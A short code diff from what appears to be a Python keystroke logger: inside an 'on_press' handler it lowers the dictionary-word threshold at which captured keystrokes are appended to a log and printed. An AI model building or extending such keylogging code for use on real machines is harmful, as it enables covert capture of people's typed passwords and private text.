@@ -42,7 +42,7 @@ def on_press(key):
 			if(word in words.words()):
 				wordcount += 1;
 
-		if(wordcount > 3):
+		if(wordcount > 2):
 			log.append(newKeys)
 			print(log)
 			wordcount = 0
